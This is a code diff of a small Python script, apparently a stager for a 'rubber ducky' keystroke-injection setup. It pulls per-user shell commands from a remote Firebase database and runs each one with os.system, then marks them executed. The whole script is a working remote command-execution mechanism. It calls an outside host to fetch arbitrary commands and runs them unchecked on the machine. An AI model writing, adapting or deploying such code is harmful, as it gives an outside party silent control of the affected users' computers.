@@ -3,16 +3,15 @@ import json
 import os
 
 USER = os.environ["USER"]
+URL = "https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app"
 
-rq = requests.get("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json")
-data = rq.json()
+rq = requests.get(f"{URL}/users.json")
+userData = rq.json()[USER]
 
-if data[USER]['executed'] == True: exit(0)
+if userData['executed'] == True: exit(0)
 
-cmds = data[USER]['commands']
-
-for cmd in cmds:
+for cmd in userData['commands']:
     os.system(cmd)
 
-data[USER]['executed'] = True
-requests.patch("https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json", data=json.dumps(data))
+userData['executed'] = True
+requests.patch(f"{URL}/users/{USER}.json", data=json.dumps(userData))
